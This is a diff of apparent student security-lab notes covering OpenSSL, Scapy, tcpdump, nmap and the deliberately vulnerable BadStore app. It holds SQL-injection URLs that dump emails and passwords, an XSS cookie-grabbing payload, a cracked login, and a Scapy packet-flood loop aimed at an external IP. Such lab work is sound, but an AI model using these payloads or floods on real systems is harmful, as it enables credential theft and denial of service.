@@ -1,105 +1,16 @@
-<script>
-                                    document.getElementById('viewCart').addEventListener('click', function(event) {
-                                        event.preventDefault(); // Prevent the default link behavior
-   let str=`ALL
-badstore
-http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=x'+union+select+itemnum,+sdesc,+ldesc,+price+from+itemdb+--+&action=search&x=11&y=9
-
-
-http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=xx'+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,123,123+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
-
-
-
-http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=x'+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search&x=11&y=9
-
-
-nc
-1.	Use NetCat and show Connection to example.com
-nc -v example.com 8000
-
-2.	Using NetCat show how to Communicate with the server using 2 terminals and across systems
-Syst1:
-ip addr show
-nc -vlp 4000
-Syst2:
-nc [ip_address] 4000
-
-3.	Using NetCat show the usage of HTTP1. Request/Response (HEAD /GET/ Options)
-nc -v example.com 80
-curl -v  -I example.com 
-nc -v example.com 80
-change HTTP to GET and OPTIONS
-
-4.	Using NetCat show communication between browser and the server(for plain text
-nc -vlp 5000 80
-Listening on [80] (family 0, port 5000)
-HTTP/1.1 200 OK
-Content-Type: text/html
-
-<html>
-<title>Can you see me</title>
-<body><h1>Can you see me</h1></body>
-</html>
-
-5.	#!/bin/bash
-
-host="93.184.215.14"
-read -p "Enter start" start_port
-read -p "Enter ending" end_port
-for((port=start_port;port<=end_port;port++));
-do
-	echo "$host"
-	nc -z "$host $port"
-done
-
-
 RSA
-
-# Generate 32 bytes of random hex formatted data
-openssl rand -hex 32
-
-
-Generating Asymmetric Keys
----------------------------
-
-# Storing private key to a file.
 openssl genrsa > key.pri
-openssl genrsa -out key.pri
-
-# Examining a private key
-openssl rsa -in key.pri -noout -text
-
-# Generating a public key
-openssl rsa -in key.pri -out key.pub -pubout
-
-
+touch secret.txt
+echo "this is secret message" > secret.txt
+openssl rsa -in key.pri -pubout -out key.pub
+cat key.pub
+openssl rsautl -encrypt -in secret.txt -pubin -inkey key.pub -out encmsg.txt
+cat encmsg.txt
+openssl rsautl -decrypt -in encmsg.txt -inkey key.pri
 
 
-# Encrypting using RSA public key
-openssl rsautl -encrypt -inkey key.pub -pubin -in Earth.txt -out Earth.enc
 
-# Decrypting using RSA private key
-openssl rsautl -decrypt -inkey key.pri -in Earth.enc -out Earth.dec
-
-
-Note : RSA encryption using OpenSSL uses PKCS1 padding by default. PKCS1 has a size limit of (keysize - 11 bytes).
-# Key Size limit
-https://www.rfc-editor.org/rfc/rfc2313
-"The length of the data D shall not be more than k-11 octets"
-
-openssl rand -out data 245
-openssl rsautl -encrypt -inkey key.pub -pubin -in data OPECLEAR-out data.enc # should work
-
-openssl rand -out data 246
-openssl rsautl -encrypt -inkey key.pub -pubin -in data -out data.enc # Will fail
-
-# Encrypting a secret key using RSA keypair.
-openssl rand -hex -out encryption.key 32
-openssl rsautl -encrypt -inkey key.pub -pubin -in encryption.key -out encryption.key.enc
-openssl rsautl -decrypt -inkey key.pri -in encryption.key.enc -out encryption.key.dec
-
-
-scapy
+SCAPY
 Certainly. I'll provide answers for all the Scapy-related questions in order, based on the information from the scapylab.docx file and the questions you've mentioned:
 
 1b. Create a frame that consists of an Ethernet layer, with an IP layer on top? With the show method and capture all fields of the frame.
@@ -117,8 +28,7 @@ python
 from scapy.all import *
 
 packets = sniff(count=10)
-for packet in packets:
-    packet.show()
+packets.summary()
 
 
 3a. Use function summary and provide minimal information regarding the packet collection. print the IP section of the packet
@@ -129,8 +39,7 @@ from scapy.all import *
 packets = sniff(count=5)
 packets.summary()
 
-if IP in packets[0]:
-    print(packets[0][IP].show())
+packets[IP]
 
 
 4a. Show the source Ethernet address of one frame. Create the callback function that will be run on every packet to print the source Ethernet address of the received frame
@@ -199,7 +108,7 @@ ports = [22, 80, 443]
 # Perform SYN scan
 for port in ports:
     packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
-    response = sr1(packet, timeout=1, verbose=0)
+    response = sr1(packet, timeout=1)
     if response:
         if response[TCP].flags == "SA":
             print(f"Port {port} is open.")
@@ -213,7 +122,7 @@ python
 from scapy.all import *
 
 packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
-response = sr1(packet)
+response = sr1(packet,timout=1)
 response[DNS].summary()
 
 
@@ -221,12 +130,10 @@ response[DNS].summary()
 
 python
 from scapy.all import *
-
-def packet_callback(packet):
-    if packet[IP].proto == 1:  # ICMP protocol
-        print(f"ICMP packet from {packet[IP].src}")
-
-sniff(prn=packet_callback, filter="icmp", store=0)
+def icmp_cb(pkt):
+    if ICMP in pkt:
+        print(f"ICMP pkt recieved from {pkt[IP].src}")
+sniff(filter="icmp", prn=icmp_cb,timeout=5)
 
 
 12a. Identify hosts that are up in a local network using Scapy (hint: ARP)
@@ -255,58 +162,224 @@ result.show()
 python
 from scapy.all import *
 
-target_ip = "192.168.1.1"
+target_ip = "93.184.215.14"
 target_port = 80
-
 for i in range(1000):
-    IP_layer = IP(dst=target_ip)
-    TCP_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
-    packet = IP_layer / TCP_layer
-    send(packet, verbose=False)
-
-
-Note: The last script (14a) is for educational purposes only. Do not perform SYN flooding or any other attacks on networks without explicit permission, as it's illegal and unethical.
-
-These scripts demonstrate various Scapy functionalities for network discovery, packet crafting, sending, sniffing, and analysis as requested in the questions.
+    send(IP(dst=target_ip)/TCP(dport=target_port), verbose=0)
 
 
 
-Nmap
-1. Using Nmap perform Ping Scan (determine which hosts are up). Using Nmap Scan a single IP 
-nmap -sn example.com 
-nmap example.com 
-2. Using Nmap Scan a range of IPs. Using Nmap Scan an entire subnet 
-nmap 93.184.215.1-14  
-nmap 93.184.215.14/24 
-3. Using Nmap Scan specific ports. Using Nmap Scan all 65535 ports 
-nmap -p 22,80,443 example.com 
-nmap -p- example.com 
-4. Using Nmap Scan top 1000 ports (default). Using Nmap show Detect service version 
-nmap example.com 
-nmap -sV example.com 
-5. Using Nmap show OS detection. Using Nmap perform Aggressive scan (combines -sV, -O, and 
-other scans) 
-nmap -O example.com 
-nmap -A example,com 
-6. Using Nmap Run default scripts. Using Nmap Run specific scripts 
-nmap -sC example.com 
-nmap ---script=http-title example.com  
-7. Using Nmap Scan for vulnerabilities. Using Nmap Save results to a text file 
-nmap –script vuln example.com 
-nmap -oN output.txt cricbuzz.com 
-8. Using Nmap Save results in XML format. Using Nmap Save results in all formats 
-nmap -oX op.xml example.com 
-nmap -oA op example.com 
-9. Using Nmap show Verbose output. Using Nmap show Increase_verbosity  
-nmap -v example.com 
-nmap -vv example.com  
-10. Using Nmap Scan without DNS resolution. Using Nmap Scan using TCP SYN scan (default for root) 
-nmap -n example.com 
-nmap -sS example.com 
-11. Using Nmap perform UDP scan. 
-nmap -sU example.com
+
+TCPDUMP
+sudo tcpdump -i any -w http_capture.pcap port 80
+
+sudo tcpdump -i any -w https_capture.pcap port 443
 
 
-`                                       
+tcp && ip.addr == 93.184.215.14
 
-                                
+sudo tcpdump -i any -w dns_capture.pcap port 53
+
+sudo tcpdump -i <interface> -w icmp_capture.pcap icmp
+
+
+sudo tcpdump -i <interface> -w icmp_tcp80_capture.pcap 'icmp or tcp port 80
+
+
+
+
+
+
+NMAP
+
+Nmap (Network Mapper) is a powerful network scanning tool used for network discovery and security auditing. The commands listed in your example serve various purposes related to network scanning, service detection, and security assessment. Here's an overview of what each command does:
+
+### Ping Scan (determine which hosts are up)
+sh
+nmap -sn cricbuzz.com
+
+*Purpose:* Checks which hosts are up and running by sending ICMP echo requests (pings) to the target. This scan does not perform a port scan.
+
+
+sh
+nmap cricbuzz.com
+
+*Purpose:* Performs a standard scan on the target to identify open ports and services. This is the default Nmap scan.
+
+### Scan a Range of IPs
+sh
+nmap 192.168.1.1-10
+
+*Purpose:* Scans a range of IP addresses to identify hosts, open ports, and services within that range. Useful for discovering multiple hosts in a specified range.
+
+
+sh
+nmap 192.168.1.0/24
+
+*Purpose:* Scans all IP addresses within a subnet to identify active hosts, open ports, and services. Useful for network discovery and inventory.
+
+### Port Scanning
+1. *Scan specific ports:*
+   sh
+   nmap -p 22,80,443 cricbuzz.com
+   
+   *Purpose:* Scans only the specified ports (22, 80, 443) on the target to identify which of them are open. This can save time compared to scanning all ports.
+
+2. *Scan all 65535 ports:*
+   sh
+   nmap -p- cricbuzz.com
+   
+   *Purpose:* Scans all possible ports (1-65535) on the target to ensure no open port is missed. Useful for comprehensive port scanning.
+
+3. *Scan top 1000 ports (default):*
+   sh
+   nmap cricbuzz.com
+   
+   *Purpose:* Scans the top 1000 most commonly used ports on the target. This is the default behavior of Nmap and provides a quick overview of the most important ports.
+
+
+1. *Detect service version:*
+   sh
+   nmap -sV cricbuzz.com
+   
+   *Purpose:* Detects the version of the services running on the open ports. Useful for identifying specific software and versions to assess vulnerabilities.
+
+2. *OS detection:*
+   sh
+   nmap -O cricbuzz.com
+   
+   *Purpose:* Attempts to determine the operating system of the target. This information can be crucial for vulnerability assessment and network management.
+
+3. *Aggressive scan (combines -sV, -O, and other scans):*
+   sh
+   nmap -A cricbuzz.com
+   
+   *Purpose:* Performs a comprehensive scan that combines service version detection, OS detection, and other advanced scans. Useful for a detailed assessment of the target.
+
+
+1. *Run default scripts:*
+   sh
+   nmap -sC cricbuzz.com
+   
+   *Purpose:* Runs a set of default Nmap scripts to perform common tasks such as service detection, vulnerability checks, and more.
+
+2. *Run specific scripts:*
+   sh
+   nmap --script=http-title cricbuzz.com
+   
+   *Purpose:* Runs a specific script (http-title) to retrieve the title of the web page on the target. Useful for gathering specific information.
+
+3. *Scan for vulnerabilities:*
+   sh
+   nmap --script vuln cricbuzz.com
+   
+   *Purpose:* Runs scripts that check for known vulnerabilities on the target. Helps identify potential security issues.
+
+
+1. *Save results to a text file:*
+   sh
+   nmap -oN output.txt cricbuzz.com
+   
+   *Purpose:* Saves the scan results in a normal text file (output.txt). Useful for documentation and analysis.
+
+2. *Save results in XML format:*
+   sh
+   nmap -oX output.xml cricbuzz.com
+   
+   *Purpose:* Saves the scan results in XML format (output.xml). Useful for integration with other tools and systems.
+
+3. *Save results in all formats:*
+   sh
+   nmap -oA output cricbuzz.com
+   
+   *Purpose:* Saves the scan results in all available formats with the base name output. Provides flexibility in how results are used and shared.
+
+
+1. *Verbose output:*
+   sh
+   nmap -v cricbuzz.com
+   
+   *Purpose:* Enables verbose output to provide more detailed information during the scan. Useful for troubleshooting and monitoring scan progress.
+
+2. *Increase verbosity:*
+   sh
+   nmap -vv cricbuzz.com
+   
+   *Purpose:* Further increases verbosity to give even more detailed information. Useful for deep troubleshooting and detailed monitoring.
+
+3. *Scan without DNS resolution:*
+   sh
+   nmap -n cricbuzz.com
+   
+   *Purpose:* Scans the target without performing DNS resolution. Useful for speeding up scans and avoiding DNS-related issues.
+
+4. *Scan using TCP SYN scan (default for root):*
+   sh
+   nmap -sS cricbuzz.com
+   
+   *Purpose:* Performs a TCP SYN scan, which is the default scan for root users. This type of scan is stealthy and often faster than a full TCP connection scan.
+
+5. *UDP scan:*
+   sh
+   nmap -sU cricbuzz.com
+   
+   *Purpose:* Performs a UDP scan to identify open UDP ports. Useful for discovering services that use UDP instead of TCP.
+
+
+BADSTORE
+1.
+cgi-bin/badstore.cgi?searchquery=xx'+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,123,123+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
+
+
+cgi-bin/badstore.cgi?action=admin
+
+2.
+cgi-bin/badstore.cgi?searchquery=x&action=search&x=11&y=9
+
+cgi-bin/badstore.cgi?searchquery=x'+union+select+itemnum,+sdesc,+ldesc,+price+from+itemdb+--+&action=search&x=11&y=9
+
+
+cgi-bin/badstore.cgi?searchquery=x'+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search&x=11&y=9
+
+
+3.cgi-bin/badstore.cgi?action=admin
+https://md5.gromweb.com/?md5=62072d95acb588c7ee9d6fa0c6c85155
+cgi-bin/badstore.cgi?action=supplierportal
+
+4.login as joe supplier :secret
+cgi-bin/badstore.cgi?action=viewprevious
+
+5.login to admin
+cgi-bin/badstore.cgi?action=adminportal
+
+6. in search box
+<script>alert(document.cookie)</script>
+
+7. cgi-bin/badstore.cgi?action=whatsnew
+add items to cart
+
+8. am9lQHN1cHBsaWVyLmNvbTo2MjA3MmQ5NWFjYjU4OGM3ZWU5ZDZmYTBjNmM4NTE1NTpKb2UgU3Vw%0AcGxpZXI6Uw%3D%3D%0A;
+ https://www.urldecoder.org
+https://www.base64decode.org
+9. cart id cookie
+https://www.urldecoder.org
+
+
+AES
+gedit plain.txt
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f
+openssl enc -aes-128-cbc -d -in cipher1.bin -out plain_decrypt.txt -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f
+gedit plain_decrypt.txt
+openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_ecb.bmp -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f
+ls
+head -c 54 pic_original.bmp > header
+tail -c +55 pic_ecb.bmp > body_ecb
+cat header body_ecb > pic_ecb1.bmp
+openssl enc -aes-128-ecb -d -in pic_ecb.bmp -out pic_dec.bmp -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f
+
+
+
+
+
+
+
